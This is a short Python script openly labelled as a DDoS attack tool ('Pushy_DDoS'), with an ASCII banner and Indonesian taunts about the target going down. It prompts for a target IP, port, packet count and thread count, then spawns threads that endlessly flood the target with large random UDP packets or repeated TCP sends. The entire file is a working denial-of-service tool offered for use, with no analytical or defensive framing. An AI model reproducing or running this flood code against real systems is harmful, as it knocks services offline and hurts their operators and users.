#!/usr/bin/env python3
#Code by pushy
#remake by raintopia
import random
import socket
import threading
print("""
███▓███   █    ██   ██████  ██░ ██▓██   ██▓
▓██░  ██▒ ██  ▓██▒▒██    ▒ ▓██░ ██▒▒██  ██▒       ▓██░ ██▓▒▓██  ▒██░░ ▓██▄   ▒██▀▀██░ ▒██ ██░
▒██▄█▓▒ ▒▓▓█  ░██░  ▒   ██▒░▓█ ░██  ░ ▐██▓░       ▒██▒ ░  ░▒▒█████▓ ▒██████▒▒░▓█▒░██▓ ░ ██▒▓░
▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒  ██▒▒▒        ░▒ ░     ░░▒░ ░ ░ ░ ░▒  ░ ░ ▒ ░▒░ ░▓██ ░▒░        ░░        ░░░ ░ ░ ░  ░  ░   ░  ░░ ░▒ ▒ ░░
            ░           ░   ░  ░  ░░ ░
                                   ░ ░
    [ ? ] Pushy_DDoS - A Distributed Denial of Service Attack Tools.""")
print("UFTTT NIH BOSS")
print("RAMEKE BY pushy,diseruyuk,anarchy,bayangxd")
print("GUNAKAN TOOLS INI JANGAN ABUSE")

ip = str(input(" IP:"))
port = int(input(" PORT:"))
choice = str(input(" Y ORE N(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(600000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" BENTAR LAGI DOWN YA!!")
		except:
			print("[!] MAMPUS DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" BENTAR LAGI DOWN YA!!")
		except:
			s.close()
			print("[*] MAMPUS DOWN!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
